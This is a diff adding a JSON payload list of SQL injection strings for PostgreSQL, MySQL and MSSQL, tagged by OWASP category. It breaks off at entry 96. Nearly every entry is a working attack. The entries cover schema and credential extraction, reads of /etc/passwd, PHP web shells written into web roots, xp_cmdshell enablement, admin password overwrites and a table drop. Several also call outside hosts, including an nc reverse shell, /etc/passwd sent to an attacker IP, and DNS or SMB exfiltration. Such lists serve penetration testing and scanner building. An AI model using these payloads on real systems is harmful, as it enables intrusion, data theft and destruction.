@@ -1,0 +1,672 @@
+[
+    {
+        "id": 1,
+        "payload": "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 2,
+        "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 3,
+        "payload": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 4,
+        "payload": "SELECT database_to_xml(true,true,''); -- dump the current database to XML\nSELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 5,
+        "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 6,
+        "payload": "select 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 7,
+        "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 8,
+        "payload": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 9,
+        "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 10,
+        "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'\nAND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 11,
+        "payload": "declare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 12,
+        "payload": "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 13,
+        "payload": "select pg_ls_dir('./');\n    select pg_read_file('PG_VERSION', 0, 200);",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 14,
+        "payload": "CREATE TABLE temp(t TEXT);\n    COPY temp FROM '/etc/passwd';\n    SELECT * FROM temp limit 1 offset 0;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 15,
+        "payload": "SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\n    SELECT lo_get(16420); -- use the OID returned from the above\n    SELECT * from pg_largeobject; -- or just get all the large objects and their data",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 16,
+        "payload": "CREATE TABLE nc (t TEXT);\n    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');\n    SELECT * FROM nc;\n    COPY nc(t) TO '/tmp/nc.sh';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 17,
+        "payload": "COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 18,
+        "payload": "SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\n    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\n    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 19,
+        "payload": "COPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 20,
+        "payload": "CREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 21,
+        "payload": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 22,
+        "payload": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 23,
+        "payload": "SHOW is_superuser; \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 24,
+        "payload": "UNION SELECT NULL;--\nUNION SELECT NULL, NULL;-- \nUNION SELECT NULL, NULL, NULL;--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 25,
+        "payload": "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 26,
+        "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 27,
+        "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 28,
+        "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 29,
+        "payload": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 30,
+        "payload": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 31,
+        "payload": "MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title                                                           |\n+-----------+-----------------------------------------------------------------+\n|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 32,
+        "payload": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))\n'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 33,
+        "payload": "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\nAND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 34,
+        "payload": "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -\nUPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 35,
+        "payload": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 36,
+        "payload": "?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 37,
+        "payload": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'\n?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 38,
+        "payload": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n    Response:\n    HTTP/1.1 500 Internal Server Error",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 39,
+        "payload": "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\n    Response:\n    HTTP/1.1 200 OK",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 40,
+        "payload": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 41,
+        "payload": "SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\nSELECT * FROM products WHERE product_name LIKE '%user_input%'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 42,
+        "payload": "+BENCHMARK(40000000,SHA1(1337))+\n    '+BENCHMARK(3200,SHA1(1))+'\n    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 43,
+        "payload": "RLIKE SLEEP([SLEEPTIME])\n    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR\n    AND SLEEP(10)=0\n    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 44,
+        "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# \n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 45,
+        "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 46,
+        "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 47,
+        "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#\n1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 48,
+        "payload": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 49,
+        "payload": "?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 50,
+        "payload": "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 51,
+        "payload": "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 52,
+        "payload": "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 53,
+        "payload": "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 54,
+        "payload": "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 55,
+        "payload": "+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 56,
+        "payload": "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 57,
+        "payload": "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 58,
+        "payload": "UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 59,
+        "payload": "UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 60,
+        "payload": "UNION ALL SELECT LOAD_FILE('/etc/passwd') --\nUNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 61,
+        "payload": "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 62,
+        "payload": "[...] UNION SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"<?php echo shell_exec($_GET['cmd']);?>\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 63,
+        "payload": "[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 64,
+        "payload": "$ mysql -u root -p mysql\nEnter password: [...]\n\nmysql> SELECT sys_eval('id');\n+--------------------------------------------------+\n| sys_eval('id') |\n+--------------------------------------------------+\n| uid=118(mysql) gid=128(mysql) groups=128(mysql) |\n+--------------------------------------------------+",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 65,
+        "payload": "attacker_dummy@example.com\", \"P@ssw0rd\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" --",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 66,
+        "payload": "INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"BCRYPT_HASH\"), (\"admin@example.com\", \"P@ssw0rd\") ON DUPLICATE KEY UPDATE password=\"P@ssw0rd\" -- \", \"BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT\");",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 67,
+        "payload": "`username` varchar(20) not null",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 68,
+        "payload": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.hacker.site\\\\a.txt'));\nSELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 69,
+        "payload": "SELECT LOAD_FILE('\\\\\\\\error\\\\abc');\nSELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);\nSELECT '' INTO DUMPFILE '\\\\\\\\error\\\\abc';\nSELECT '' INTO OUTFILE '\\\\\\\\error\\\\abc';\nLOAD DATA INFILE '\\\\\\\\error\\\\abc' INTO TABLE DATABASE.TABLE_NAME;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 70,
+        "payload": "SELECT * FROM mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\nmysql> SHOW TABLES IN dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users          |\n+----------------+",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 71,
+        "payload": "mysql> SELECT @@innodb_version;\n+------------------+\n| @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\n\nmysql> SELECT @@version;\n+-------------------------+\n| @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql> SELECT version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql> SELECT @@GLOBAL.VERSION;\n+------------------+\n| @@GLOBAL.VERSION |\n+------------------+\n| 8.0.27           |\n+------------------+",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 72,
+        "payload": "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 73,
+        "payload": "%A8%27 OR 1=1;--\n%8C%A8%27 OR 1=1--\n%bf' OR 1=1 -- --",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 74,
+        "payload": "SELECT name FROM master..sysdatabases;\nSELECT name FROM master.sys.databases;\n\n-- for N = 0, 1, 2, \u2026\nSELECT DB_NAME(N); \n\n-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb \n-- (Only works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysdatabases;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 75,
+        "payload": "-- use xtype = 'V' for views\nSELECT name FROM master..sysobjects WHERE xtype = 'U';\nSELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'\nSELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';\n\n-- list column names and types for master..sometable\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';\n\nSELECT table_catalog, table_name FROM information_schema.columns\nSELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'\n\n-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)\nSELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 76,
+        "payload": "-- for the current DB only\nSELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');\n\n-- list column names and types for master..sometable\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; \n\nSELECT table_catalog, column_name FROM information_schema.columns\n\nSELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 77,
+        "payload": "$ SELECT name FROM master..sysdatabases\n    [*] Injection\n    [*] msdb\n    [*] tempdb",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 78,
+        "payload": "$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n    [*] Profiles\n    [*] Roles\n    [*] Users",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 79,
+        "payload": "$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n    [*] UserId\n    [*] UserName",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 80,
+        "payload": "$ SELECT  UserId, UserName from Users",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 81,
+        "payload": "convert(int,@@version)\n    cast((SELECT @@version) as int)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 82,
+        "payload": "' + convert(int,@@version) + '\n    ' + cast((SELECT @@version) as int) + '",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 83,
+        "payload": "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 84,
+        "payload": "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'\nWITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)\nSELECT message FROM data WHERE row = 1 and message like 't%'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 85,
+        "payload": "AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'\nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 86,
+        "payload": "ProductID=1;waitfor delay '0:0:10'--\nProductID=1);waitfor delay '0:0:10'--\nProductID=1';waitfor delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\nProductID=1));waitfor delay '0:0:10'--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 87,
+        "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'\nIF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 88,
+        "payload": "-- multiple SELECT statements\n    SELECT 'A'SELECT 'B'SELECT 'C'\n\n    -- updating password with a stacked query\n    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--\n\n    -- using the stacked query to enable xp_cmdshell\n    -- you won't have the output of the query, redirect it to a file \n    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 89,
+        "payload": "ProductID=1; DROP members--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 90,
+        "payload": "OPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 91,
+        "payload": "-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 92,
+        "payload": "execute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 93,
+        "payload": "EXEC xp_cmdshell \"net user\";\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 94,
+        "payload": "EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 95,
+        "payload": "1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';--",
+        "owaspCategory": "SQL Injection"
+    },
+    {
+        "id": 96,
